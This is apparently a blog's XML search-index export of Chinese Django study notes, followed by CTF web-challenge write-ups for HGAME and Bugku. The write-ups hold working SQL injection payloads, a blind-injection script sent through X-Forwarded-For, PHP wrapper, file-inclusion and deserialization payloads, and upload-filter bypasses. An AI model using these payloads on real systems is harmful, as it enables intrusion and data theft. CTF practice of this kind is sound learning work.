BooleanField：true/false 字段，此字段的默认表单控制是CheckboxInput NullBooleanField：支持null、true、false三种值 CharField(max_length=字符长度)：字符串，默认的表单样式是 TextInput TextField：大文本字段，一般超过4000使用，默认的表单控件是Textarea IntegerField：整数 DecimalField(max_digits=None, decimal_places=None)：使用python的Decimal实例表示的十进制浮点数 DecimalField.max_digits：位数总数 DecimalField.decimal_places：小数点后的数字位数 FloatField：用Python的float实例来表示的浮点数 DateField[auto_now=False, auto_now_add=False])：使用Python的datetime.date实例表示的日期 参数DateField.auto_now：每次保存对象时，自动设置该字段为当前时间，用于”最后一次修改”的时间戳，它总是使用当前日期，默认为false 参数DateField.auto_now_add：当对象第一次被创建时自动设置当前时间，用于创建的时间戳，它总是使用当前日期，默认为false 该字段默认对应的表单控件是一个TextInput. 在管理员站点添加了一个JavaScript写的日历控件，和一个“Today”的快捷按钮，包含了一个额外的invalid_date错误消息键 auto_now_add, auto_now, and default 这些设置是相互排斥的，他们之间的任何组合将会发生错误的结果 TimeField：使用Python的datetime.time实例表示的时间，参数同DateField DateTimeField：使用Python的datetime.datetime实例表示的日期和时间，参数同DateField FileField：一个上传文件的字段，一般不用这个，通常上传到服务器，记录路径 ImageField：继承了FileField的所有属性和方法，但对上传的对象进行校验，确保它是个有效的image，也不用 字段选项 在字段对象时通过关键字参数指定,实现对字段的约束 null：如果为True，Django 将空值以NULL 存储到数据库中，默认值是 False，NULL值尽量不要存入数据库 blank：如果为True，则该字段允许传入数据库时不填写，默认值是 False 对比：null是数据库范畴的概念，blank是表单验证证范畴的 db_column：字段的名称，如果未指定，则把属性的名称作为数据库字段的名称 ，不影响在danjo对数据的操作 db_index：若值为 True, 则在表中会为此字段创建索引 default：默认值，数据库不添加 primary_key：若为 True, 则该字段会成为模型的主键字段 unique：如果为 True, 这个字段在表中必须有唯一值 关系 关系的类型包括 ForeignKey：一对多，将字段定义在多的端中 ManyToManyField：多对多，将字段定义在两个表中 OneToOneField：一对一，将字段定义在任意一端中 可以维护递归的关联关系，使用’self’指定，详见“自关联” 访问得到的对应的对象 用一访问多：对象.模型类小写_set 1bookinfo.heroinfo_set 用一访问一：对象.模型类小写 1heroinfo.bookinfo 访问id：对象.属性_id 12heroinfo.book_idheroinfo.book.id 元选项 在模型类中定义类Meta，用于设置元信息 元信息db_table：定义数据表名称，推荐使用小写字母，数据表的默认名称 1_ ordering：对象的默认排序字段，获取对象的列表时使用，接收属性构成的列表 1234class BookInfo(models.Model): ... class Meta(): ordering = [&apos;id&apos;] 字符串前加-表示倒序，不加-表示正序 1234class BookInfo(models.Model): ... class Meta(): ordering = [&apos;-id&apos;] 排序会增加数据库的开销 模型的成员类的属性管理器Manager objects：是Manager类型的对象，用于与数据库进行交互 当定义模型类时没有指定管理器，则Django自动为为模型类提供一个名为objects的管理器 模型类的管理器可以自己指定，作为属性 123class BookInfo(models.Model): ... books = models.Manager() 当为模型类指定管理器后，django不再为模型类生成名为objects的默认管理器 管理器是Django的模型进行数据库的查询操作的接口，Django应用的每个模型都拥有至少一个管理器 自定义管理器类主要用于两种情况 情况一：向管理器类中添加额外的方法：见下面“创建对象”中的方式二 情况二：修改管理器返回的原始查询集：重写get_queryset()方法 1234567class BookInfoManager(models.Manager): def get_queryset(self): # super() 调用父类的方法，多重继承传入要调用的前一个 return super(BookInfoManager, self).get_queryset().filter(isDelete=False)class BookInfo(models.Model): ... books = BookInfoManager() 实例化创建对象 当创建对象时，django不会对数据库进行读写操作 调用save()方法才与数据库交互，将对象保存到数据库中 使用关键字参数构造模型对象很麻烦，推荐使用下面的两种之式 说明：_ init _方法已经在基类models.Model中使用，在自定义模型中无法使用， 方式一：在模型类中增加一个类方法 123456789101112class BookInfo(models.Model): ... @classmethod def create(cls, title, pub_date): book = cls(btitle=title, bpub_date=pub_date) book.bread=0 book.bcommet=0 book.isDelete = False return book引入时间包：from datetime import *调用：book=BookInfo.create(&quot;hello&quot;,datetime(1980,10,11));保存：book.save() 方式二：在自定义管理器中添加一个方法 在管理器的方法中，可以通过self.model来得到它所属的模型类 123456789101112131415class BookInfoManager(models.Manager): def create_book(self, title, pub_date): book = self.model() book.btitle = title book.bpub_date = pub_date book.bread=0 book.bcommet=0 book.isDelete = False return bookclass BookInfo(models.Model): ... books = BookInfoManager()调用：book=BookInfo.books.create_book(&quot;abc&quot;,datetime(1980,1,1))保存：book.save() 在方式二中，可以调用self.create()创建并保存对象，不需要再手动save() 12345678910class BookInfoManager(models.Manager): def create_book(self, title, pub_date): book = self.create(btitle = title,bpub_date = pub_date,bread=0,bcommet=0,isDelete = False) return bookclass BookInfo(models.Model): ... books = BookInfoManager()调用：book=Book.books.create_book(&quot;abc&quot;,datetime(1980,1,1))查看：book.pk 模型类更改后如果迁移失败，删除迁移文件在迁移 实例的属性 DoesNotExist：在进行单个查询时，模型的对象不存在时会引发此异常，结合try/except使用 实例的方法 str (self)：重写object方法，此方法在将对象转换成字符串时会被调用 save()：将模型对象保存到数据表中 delete()：将模型对象从数据表中删除 模型的查询基本概念 查询集表示从数据库中获取的对象集合 查询集可以含有零个、一个或多个过滤器 过滤器基于所给的参数限制查询的结果 从Sql的角度，查询集和select语句等价，过滤器像where和limit子句 模型查询的主要内容 查询集 字段查询：比较运算符，F对象，Q对象 查询集 在管理器上调用过滤器方法会返回查询集 查询集经过过滤器筛选后返回新的查询集，因此可以写成链式过滤 惰性执行：创建查询集不会带来任何数据库的访问，直到调用数据时，才会访问数据库 查询集在调用数据时会进行缓存，两种情况不会 未存入变量 第一次使用[1:10]限制，第二次取[11:20]的数据不会被缓存 何时对查询集求值：迭代，序列化，与if合用 返回查询集的方法，称为过滤器 查询集返回查询集的方法，称为过滤器 返回多个值，列表或者字典 all() 返回所有 filter() 返回过滤的结果 exclude() 返回未被过滤的值 order_by() 排序 values()：一个对象构成一个字典，然后构成一个列表返回 写法： filter(键1=值1,键2=值2)逻辑与的关系，等价于filter(键1=值1).filter(键2=值2) 返回单个值 get()：返回单个满足条件的对象 如果未找到会引发”模型类.DoesNotExist”异常 如果多条被返回，会引发”模型类.MultipleObjectsReturned”异常 count()：返回当前查询的总条数 first()：返回第一个对象 last()：返回最后一个对象 exists()：判断查询集中是否有数据，如果有则返回True aggregate(): 返回聚合函数的值，可用函数：Avg，Count，Max，Min，Sum，需要使用下面的语句引用，Count一般直接使用上面的12from django.db.models import MaxmaxDate = list.aggregate(Max(&apos;bpub_date&apos;)) 查询集返回列表，可以使用下标的方式进行获取，但是不支持负索引 如果获取一个对象，直接使用[0]，等同于[0:1].get()，但是如果没有数据，[0]引发IndexError异常，[0:1].get()引发DoesNotExist异常 字段查询 实现where子名，作为方法filter()、exclude()、get()的参数 语法：属性名称__比较运算符=值 表示两个下划线，左侧是属性名称，右侧是比较类型 对于外键，使用“属性名_id”表示外键的原始值 转义：like语句中使用了%与，匹配数据中的%与，在过滤器中直接写，例如：filter(title__contains=”%”)=&gt;where title like ‘%\%%’，表示查找标题中包含%的 比较运算符是否包含值 exact：表示判等，大小写敏感；如果没有写“_ _比较运算符”，表示判等,通常使用等号 1filter(isDelete=False) contains：是否包含，大小写敏感 1exclude(btitle__contains=&apos;传&apos;) startswith、endswith：以value开头或结尾，大小写敏感 1exclude(btitle__endswith=&apos;传&apos;) isnull、isnotnull：是否为null 1filter(btitle__isnull=False) 在前面加个i表示不区分大小写，如iexact、icontains、istarswith、iendswith in：是否包含在范围内 1filter(pk__in=[1, 2, 3, 4, 5]) 大小的比较 gt、gte、lt、lte：大于、大于等于、小于、小于等于 1filter(id__gt=3) 日期的比较 year、month、day、week_day、hour、minute、second：对日期间类型的属性进行运算 12filter(bpub_date__year=1980)filter(bpub_date__gt=date(1980, 12, 31)) 跨关联关系的查询 跨关联关系的查询：处理join查询 语法：模型类名_ &lt;属性名&gt; _&lt;比较&gt; 注：可以没有__&lt;比较&gt;部分，表示等于，结果同inner join 可返向使用，即在关联的两个模型中都可以使用 1filter(heroinfo_ _hcontent_ _contains=&apos;八&apos;) 小技巧 查询的快捷方式：pk，pk表示primary key，默认的主键是id 1filter(pk__lt=6) F对象 需要数据内部的比较，使用F对象，需要导入 可以使用模型的字段A与字段B进行比较，如果A写在了等号的左边，则B出现在等号的右边，需要通过F对象构造 1list.filter(bread__gte=F(&apos;bcommet&apos;)) django支持对F()对象使用算数运算 1list.filter(bread__gte=F(&apos;bcommet&apos;) * 2) F()对象中还可以写作“模型类__列名”进行关联查询 1list.filter(isDelete=F(&apos;heroinfo__isDelete&apos;)) 对于date/time字段，可与timedelta()进行运算 1list.filter(bpub_date__lt=F(&apos;bpub_date&apos;) + timedelta(days=1)) Q对象 进行或运算 过滤器的方法中关键字参数查询，会合并为And进行 需要进行or查询，使用Q()对象 Q对象(django.db.models.Q)用于封装一组关键字参数，这些关键字参数与“比较运算符”中的相同 12from django.db.models import Qlist.filter(Q(pk_ _lt=6)) Q对象可以使用&amp;（and）、|（or）操作符组合起来 当操作符应用在两个Q对象时，会产生一个新的Q对象 12list.filter(pk_ _lt=6).filter(bcommet_ _gt=10)list.filter(Q(pk_ _lt=6) | Q(bcommet_ _gt=10)) 使用~（not）操作符在Q对象前表示取反 1list.filter(~Q(pk__lt=6)) 可以使用&amp;|~结合括号进行分组，构造做生意复杂的Q对象 过滤器函数可以传递一个或多个Q对象作为位置参数，如果有多个Q对象，这些参数的逻辑为and 过滤器函数可以混合使用Q对象和关键字参数，所有参数都将and在一起，Q对象必须位于关键字参数的前面 自连接 对于地区信息，属于一对多关系，使用一张表，存储所有的信息 类似的表结构还应用于分类信息，可以实现无限级分类 新建模型AreaInfo，生成迁移 123class AreaInfo(models.Model): atitle = models.CharField(max_length=20) aParent = models.ForeignKey(&apos;self&apos;, null=True, blank=True) 访问关联对象 12上级对象：area.aParent下级对象：area.areainfo_set.all()]]></content>
      <categories>
        <category>web开发</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>Django</tag>
        <tag>python</tag>
        <tag>web开发</tag>
        <tag>mvt</tag>
        <tag>mvc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DjangoViews]]></title>
    <url>%2Fold_post%2FDjangoViews.html</url>
    <content type="text"><![CDATA[传智博客的python的笔记 URLconf基本概念 manage.py项目入口，指向项目的setting.py在settings.py文件中通过ROOT_URLCONF指定根级url的配置 urlpatterns是一个url()实例的列表 一个url()对象包括： 正则表达式 视图函数 名称name 编写URLconf的注意： 若要从url中捕获一个值，需要在它周围设置一对圆括号 不需要添加一个前导的反斜杠，如应该写作’test/‘，而不应该写作’/test/‘ 每个正则表达式前面的r表示字符串不转义 请求的url被看做是一个普通的python字符串，进行匹配时不包括get或post请求的参数及域名` 基本使用 先利用import包含视图，通过关键字参数传递给视图，本例中关键字参数为id，可以不指定关键字，则按顺序给视图 1url(r&apos;^(?P&lt;id&gt;[0-9]+)/$&apos;, views.detail, name=&apos;detail&apos;), 包含其它的URLconfs 在应用中创建urls.py文件，定义本应用中的urlconf，再在项目的settings中使用include()，包含本应用的url，注意需要用引号包裹，可以除去urlconf冗余 1234from django.conf.urls import include, urlurlpatterns = [ url(r&apos;^&apos;, include(&apos;booktest.urls&apos;, namespace=&apos;booktest&apos;)),] 匹配过程：先与主URLconf匹配，通常会带者后面的斜杠，成功后再将剩余的部分与应用中的URLconf匹配， 参数：视图会收到来自父URLconf、当前URLconf捕获的所有参数 在include中通过namespace定义命名空间，用于反解析，通常在父级目录 URL的反向解析硬链接在视图模板中难以维护，使用反向解析，可以解决这个问题 视图：使用django.core.urlresolvers.reverse()函数 模板：使用url模板标签 视图函数定义视图在views.py 中编写函数，在 url.py 中引用 错误视图 Django 自带几个错误视图用于处理http错误 404 错误 defaults.page_not_found(request, template_name=’404.html’) 需要在templates中创建404.html 默认的404视图将传递一个变量给模板：request_path，它是导致错误的URL 需要将debug改为false，并且在ALLOWED_HOSTS 添加允许的url 如 ‘*’ 500错误同404 默认不传递变量给模板 400错误来自客户端的操作同500 HttpReqeust对象服务器根据报文创建，需要在视图的第一个参数接收 属性 下面除非特别说明，httpreqeust属性都是只读的 path：一个字符串，表示请求的页面的完整路径，不包含域名 method：一个字符串，表示请求使用的HTTP方法，常用值包括：’GET’、’POST’ encoding：一个字符串，表示提交的数据的编码方式 如果为None则表示使用浏览器的默认设置，一般为utf-8 这个属性是可写的，可以通过修改它来修改访问表单数据使用的编码，接下来对属性的任何访问将使用新的encoding值 GET：一个类似于字典的对象，QueryDict对象，与字典的差别，可能存在一键多值，使用dict.getlist(‘键’,default)返回列表，.get 只会返回最后一个值，使用包含get请求方式的所有参数 POST：一个类似于字典的对象，包含post请求方式的所有参数 FILES：一个类似于字典的对象，包含所有的上传文件 COOKIES：一个标准的Python字典，包含所有的cookie，键和值都为字符串 session：一个既可读又可写的类似于字典的对象，表示当前的会话，只有当Django 启用会话的支持时才可用，详细内容见“状态保持” 方法 is_ajax()：如果请求是通过XMLHttpRequest发起的，则返回True HttpResponse对象浏览器返回的请求对象 基本写法123456789101112from django.http import HttpResponsefrom django.template import RequestContext, loader#简写函数from django.shortcuts import renderdef index(request): &apos;&apos;&apos; t1 = loader.get_template(&apos;polls/index.html&apos;) context = RequestContext(request, &#123;&apos;h1&apos;: &apos;hello&apos;&#125;) return HttpResponse(t1.render(context)) &apos;&apos;&apos; # 简写 return render(request, &apos;booktest/index.html&apos;, &#123;&apos;h1&apos;: &apos;hello&apos;&#125;) 属性 content：表示返回的内容，字符串类型 charset：表示response采用的编码字符集，字符串类型 status_code：响应的HTTP响应状态码 content-type：指定输出的MIME类型 方法 init ：使用页内容实例化HttpResponse对象 write(content)：以文件的方式写 flush()：以文件的方式输出缓存区 set_cookie(key, value=’’, max_age=None, expires=None)：设置Cookie key、value都是字符串类型 max_age是一个整数，表示在指定秒数后过期 expires是一个datetime或timedelta对象，会话将在这个指定的日期/时间过期，注意datetime和timedelta值只有在使用PickleSerializer时才可序列化 max_age与expires二选一 如果不指定过期时间，则两个星期后过期 12345678910from django.http import HttpResponsefrom datetime import *def index(request): response = HttpResponse() if request.COOKIES.has_key(&apos;h1&apos;): response.write(&apos;&apos; + request.COOKIES[&apos;h1&apos;] + &apos;&apos;) response.set_cookie(&apos;h1&apos;, &apos;你好&apos;, 120) # response.set_cookie(&apos;h1&apos;, &apos;你好&apos;, None, datetime(2016, 10, 31)) return response delete_cookie(key)：删除指定的key的Cookie，如果key不存在则什么也不发生 两个子类子类HttpResponseRedirect重定项，构造函数第一个对象为重定向的地址，为域名端口后面的部分， 推荐使用反向解析 1234from django.core.urlresolvers import reversedef index(request): return HttpResponseRedirect(reverse(&apos;booktest:index2&apos;, args=(1,))) 可以使用redirect（）函数简写，需要 from django.shortcuts import redirect 子类JsonResponse返回json， JsonResponse的默认Content-Type为application/json1234from django.http import JsonResponsedef index2(requeset): return JsonResponse(&#123;&apos;list&apos;: &apos;abc&apos;&#125;) 简写函数 render redirect get_object_or_404(klass, args, *kwargs) 通过模型管理器或查询集调用get()方法，如果没找到对象，不引发模型的DoesNotExist异常，而是引发Http404异常,返回404错误页面，如果找到多个对象将引发MultipleObjectsReturned异常12345678910from django.shortcuts import *def detail(request, id): try: book = get_object_or_404(BookInfo, pk=id) except BookInfo.MultipleObjectsReturned: book = None return render(request, &apos;booktest/detail.html&apos;, &#123;&apos;book&apos;: book&#125;)将settings.py中的DEBUG改为False get_list_or_404(klass, args, *kwargs) 同上，不过是列表 session 使用cookie，所有数据存储在客户端，注意不要存储敏感信息 推荐使用sesison方式，所有数据存储在服务器端，在客户端cookie中存储session_id 启用session 使用django-admin startproject创建的项目默认启用 在settings.py文件中 12345项INSTALLED_APPS列表中添加：&apos;django.contrib.sessions&apos;,项MIDDLEWARE_CLASSES列表中添加：&apos;django.contrib.sessions.middleware.SessionMiddleware&apos;, 禁用会话：删除上面指定的两个值，禁用会话将节省一些性能消耗 使用session 启用会话后，每个HttpRequest对象将具有一个session属性，它是一个类字典对象 get(key, default=None)：根据键获取会话的值 clear()：清除所有会话 flush()：删除当前的会话数据并删除会话的Cookie del request.session[‘member_id’]：删除会话 会话过期时间 set_expiry(value)：设置会话的超时时间 如果没有指定，则两个星期后过期 如果value是一个整数，会话将在values秒没有活动后过期 若果value是一个imedelta对象，会话将在当前时间加上这个指定的日期/时间过期 如果value为0，那么用户会话的Cookie将在用户的浏览器关闭时过期 如果value为None，那么会话永不过期 修改视图中login_handle函数，查看效果 1234567def login_handle(request): request.session[&apos;uname&apos;] = request.POST[&apos;uname&apos;] # request.session.set_expiry(10) # request.session.set_expiry(timedelta(days=5)) # request.session.set_expiry(0) # request.session.set_expiry(None) return redirect(reverse(&apos;main:index&apos;)) 存储session 使用存储会话的方式，可以使用settings.py的SESSION_ENGINE项指定,需要自己添加 基于数据库的会话：这是django默认的会话存储方式，需要添加django.contrib.sessions到的INSTALLED_APPS设置中，运行manage.py migrate在数据库中安装会话表，可显示指定为 1SESSION_ENGINE=&apos;django.contrib.sessions.backends.db&apos; 基于缓存的会话：只存在本地内在中，如果丢失则不能找回，比数据库的方式读写更快 1SESSION_ENGINE=&apos;django.contrib.sessions.backends.cache&apos; 可以将缓存和数据库同时使用：优先从本地缓存中获取，如果没有则从数据库中获取 1SESSION_ENGINE=&apos;django.contrib.sessions.backends.cached_db&apos; 使用Redis缓存session 会话还支持文件、纯cookie、Memcached、Redis等方式存储，下面演示使用redis存储 安装包 1pip install django-redis-sessions 修改settings中的配置，增加如下项 123456SESSION_ENGINE = &apos;redis_sessions.session&apos;SESSION_REDIS_HOST = &apos;localhost&apos;SESSION_REDIS_PORT = 6379SESSION_REDIS_DB = 0SESSION_REDIS_PASSWORD = &apos;&apos;SESSION_REDIS_PREFIX = &apos;session&apos; 管理redis的命令 1234567启动：sudo redis-server /etc/redis/redis.conf停止：sudo redis-server stop重启：sudo redis-server restartredis-cli：使用客户端连接服务器keys *：查看所有的键get name：获取指定键的值del name：删除指定名称的键]]></content>
      <categories>
        <category>web开发</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>Django</tag>
        <tag>python</tag>
        <tag>web开发</tag>
        <tag>mvt</tag>
        <tag>mvc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基本操作相关]]></title>
    <url>%2Fold_post%2FDjango%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E7%9B%B8%E5%85%B3.html</url>
    <content type="text"><![CDATA[传智博客的python的笔记 创建虚拟环境 创建：mkvirtualenv [虚拟环境名称] 可以使用-p指定要用到python解释器virtualenv -p /usr/bin/python2.7 my_project_env 删除：rmvirtualenv [虚拟环境名称] 进入：workon [虚拟环境名称] 注：命令提示符前面会变 退出：deactivate 所有的虚拟环境，都位于/home/.virtualenvs目录下 查看当前的所有虚拟环境：workon [两次tab键] 查看虚拟环境中已经安装的包 list会列出所有包，包括pip之类的 freeze只会列出后来需要安装的，以==的格式12pip listpip freeze 虚拟环境中已经安装的包导出 1pip freeze -l &gt; packages.txt 安装django 建议安装1.8.2版本，这是一个稳定性高、使用广、文档多的版本 1pip install django==1.8.2 查看版本：进入python shell，运行如下代码 12import djangodjango.get_version() 说明：使用pip install django命令进行安装时，会自动删除旧版本，再安装新版本 创建项目 命令django-admin startproject test1 进入test1目录，目录结构如下图： 目录说明 manage.py：一个命令行工具，可以使你用多种方式对Django项目进行交互 内层的目录：项目的真正的Python包 __init_ _.py：一个空文件，它告诉Python这个目录应该被看做一个Python包 settings.py：项目的配置 urls.py：项目的URL声明 wsgi.py：项目与WSGI兼容的Web服务器入口 创建应用 在一个项目中可以创建一到多个应用，每个应用进行一种业务处理 创建应用的命令： 1python manage.py startapp booktest 应用的目录结构如下图 migration 是模型向数据库迁移的文件，使用者不用管 test 是测试模块 创建好后需要在setting.py 的 INSTALLED_APPS 中添加应用名 语句测试 python manage.py shell123from booktest.models import *# 创建对象b，赋值，对象的属性b.save() # 保存 退出shell后，12python manage.py makemigrationspython manage.py migrate pycharm配置 进入setting下的project下的project的project Interpreter 添加home .. /.vir 下的虚拟环境选择python解释器]]></content>
      <categories>
        <category>web开发</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>Django</tag>
        <tag>python</tag>
        <tag>web开发</tag>
        <tag>mvc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Django基本概念]]></title>
    <url>%2Fold_post%2FDjango%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html</url>
    <content type="text"><![CDATA[传智博客的python的笔记 MVC 核心思想：解耦 降低各模块之间的耦合性，方便变更，实现代码重用 基本模块 model: 对数据库层的封装 view: 用于展示结果 controller: 是核心，用于处理请求，获取数据，返回结果 MVT Django s是mvt框架 m表示model，负责与数据库交互 v表示view，是核心，负责接收请求、获取数据、返回结果 t表示template，负责呈现内容到浏览器 差异Django 请求的处理是使用正则匹配，然后交给对应的视图，view从model获取数据，载入模板解析，然后返回给用户，所以是核心]]></content>
      <categories>
        <category>web开发</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>Django</tag>
        <tag>python</tag>
        <tag>web开发</tag>
        <tag>mvc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hgame_week1]]></title>
    <url>%2Fold_post%2Fhgame-week1.html</url>
    <content type="text"><![CDATA[HGAME 2019 week-1 writeup 谁吃了我的flag本来看题目没什么头绪，看到谁吃还以为是要把另一半flag拼上去，在http响应头看到etag，和给的半截flag各种拼，无果，后来发现给的flag英文是源码泄露的意思，试了几种常见的，最后发现是vim编辑器非正常退出留下.index.html.swpvim -r index.html 拿到flag 换头大作战利用burp各种构造如下，拿到flag very easy web代码先检查vidar，之后又解码了一次，把一个字母双重url编码即可绕过 http://120.78.184.111:8080/week1/very_ez/index.php?id=vid%2561r can u find me?当时看到12姑娘还去百度了一下，，，后来发现他可能就是f12的意思。。。。。 查看源码，提示f12.php，然后用post提交password，值在http响应头里，后面访问iamflag.php,在burp历史看到flag #Pro的Python教室(一) 把enc2进行base64解码拼接即可拿到flag，enc3没看懂，反向加密后不对，直接拼接，提交成功]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>ctf</tag>
        <tag>hgame</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku-2]]></title>
    <url>%2Fold_post%2Fbugku-2.html</url>
    <content type="text"><![CDATA[接下来开始认真写 成绩 sql字符型注入 id=-1’ union select 1,2,3,4# id=-1’ union select 1,2,3,database()# id=-1’ union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()# id=-1’ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467# id=-1’ union select 1,2,3,skctf_flag from fl4g# 拿到结果 老司机1234567891011import requestsimport reurl='http://123.206.87.240:8002/qiumingshan/'s = requests.Session()r = s.get(url)searchObj = re.search(r'^&lt;div&gt;(.*)=\?;&lt;/div&gt;$', r.text, re.M | re.S)d = &#123; "value": eval(searchObj.group(1))&#125;r = s.post(url, data=d)print(r.text.encode("latin1").decode("utf-8")) 好像得多跑几次才会出结果 速度要快123456789101112131415#coding:utf-8import requestsimport base64url ='http://123.206.87.240:8002/web6/'r =requests.session()headers = r.get(url).headers#flag = head['Flag'].split(':')[0] 注意response的键#print flagflag = base64.b64decode(base64.b64decode(headers['flag']).split(':')[1])data=&#123;'margin':flag&#125;print r.post(url=url,data=data).content #.text cookie 欺骗1234567891011121314#coding:utf-8import requestsurl ='http://123.206.87.240:8002/web11/'r =requests.session()i = 1text = ''for i in range(18): text += r.get(url+'?line='+str(i)+'&amp;filename=aW5kZXgucGhw').contentprint text` 跑出php代码 12345678910111213141516171819error_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 伪装cookle，拿到flag never give up 各种绕之后拿到源码 12345678910111213141516171819202122232425if(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("f4l2a3g.txt");&#125;else&#123; print "never never never give up !!!";&#125;?&gt; 构造id=0eij&amp;a=php://input&amp;b=%0023456post： bugku is a nice plateform! 其实可以直接访问那个txt，不过我们是来练习的附 PHP 类型比较表PHP 伪协议PHP 黑魔法 构造 txt=php://input&amp;file=php://filter/read/convert.base64-encode/resource=hint.php HTTP/1.112345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; txt=php://input&amp;file=php://filter/read/convert.base64-encode/resource=index..php1234567891011121314151617181920212223242526272829303132&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "不能现在就给你flag哦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; password反序化 O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} 构造 txt=php://input&amp;file=hint.php&amp;password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22; 拿到flag 一句话木马，不知道说啥 /?s=print_r(scandir(%27./%27)); 正则表达式………… 看html源码 那个链接二字可以点，其他没什么都是以前的东西 login3SQL约束攻击 你从哪里来改refer MD5碰撞0e 加上 X-Forwarded-For: 127.0.0.1 都是以前的，没什么 看robots.txt访问resusl.php直接将x赋值为admin，没想到直接就拿到了flag 黑人问号脸！！！！ 不懂这个题，它重命名了鸭，绕过有什么意义。。。网上查了下，大佬们说这道题是后缀名黑名单检测和类型检测文件上传是post+ multipart/form-data请求multipart/form-data请求改修改Content-type后字母的大小写可以绕过walf检测修改后缀名php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名）发现php5未过滤，拿到flag insert intoxff 时间盲注,过滤了引号 我之前时间延迟盲注都是用 if(exp1,exp2,epx3) 这种格式来完成的，但是这里的一段代码，相当于把 “,” 给过滤了 $ip_arr = explode(‘,’, $ip); return $ip_arr[0]; 于是改变方法，用 case when exp1 then sleep(4) else 1 end 来绕过 “,”的限制 exp1 中要用到substr来进行剪切，这个函数substr(str,1,1) 又是存在 “,” , 于是这里我又用 substr (str) from 1 for 1 来绕过 “,”的限制 又拼接的语句为value(‘ 输入的内容 ‘)，最后的poc为： 1’ and (case when (length((select database())) = 14) then sleep(4) else 1 end) # 1’ and (case when (substr(select database()) from 1 for 1)=’c’ then sleep(4) else 1 end) # 构成的完整语句为 insert into client_ip (ip) values (‘ 1’ and (case when (length((select database())) = 14) then sleep(4) else 1 end) # ‘)0x03: 最后附上python脚本： 复制代码 #-- encoding: utf-8 -- #字符长度直接手工测的import requestsurl=”http://120.24.86.145:8002/web15/&quot;flag=”” #data = 11’ and (case when (length((select group_concat(table_name) from information_schema.tables where table_name=database()))=14) then sleep(4) else 1 end)) # #爆表名 长度为14 #data = “11’and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ) from “ + str(i) + “ for 1 )=’” + str1 + “‘) then sleep(4) else 1 end )) #” #client_ip,flag #data = 11’ and (case when (length((select group_concat(column_name) from information_schema.columns where table_name=’flag’))=4) then sleep(4) else 1 end)) # #爆字段 长度为4 #data = “11’ and (case when (substr((select group_concat(column_name) from information_schema.columns where table_name=’flag’) from “ + str(i) + “ for 1 )=’” + str1 + “‘) then sleep(4) else 1 end )) #” #flag #data = 11’ and (case when (length((select group_concat(flag) from flag))=32) then sleep(4) else 1 end)) # #爆内容 长度为32 #data = “11’ and (case when (substr((select group_concat(flag) from flag) from “ + str(i) + “ for 1 )=’” + str1 + “‘) then sleep(4) else 1 end )) #” for i in range(1,33): for str1 in “0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*.”: data = “11’ and (case when (substr((select group_concat(flag) from flag) from “ + str(i) + “ for 1 )=’” + str1 + “‘) then sleep(4) else 1 end )) #” # print data headers = {&quot;x-forwarded-for&quot;:data} try: result = requests.get(url,headers=headers,timeout=3) except requests.exceptions.ReadTimeout, e: flag += str1 print flag break print ‘flag:’ + flag复制代码 不同阶段把上面注释掉的data的赋值代码贴入下面即可，爆长度可以直接在BurpSuite里面发包手测 ps：在注表名的时候 “,”因为是被过滤了的，所以脚本跑出来两个表之间的“,”是被过滤了，但是看单词也能把它区分开。 登录框这个登陆成功后会有返回，可以联合查询，不过其他人各种方法，我都试试吧,有报错，显错注入，时间和布尔的盲注 1.这个闭合要用双引号，比较奇怪判断存在注入点 admin_name=admin”or 1= 1%23&amp;admin_passwd=aaaa&amp;submit=GO+GO+GO因为登陆后有回显，联合查询admin_name=admin” union select 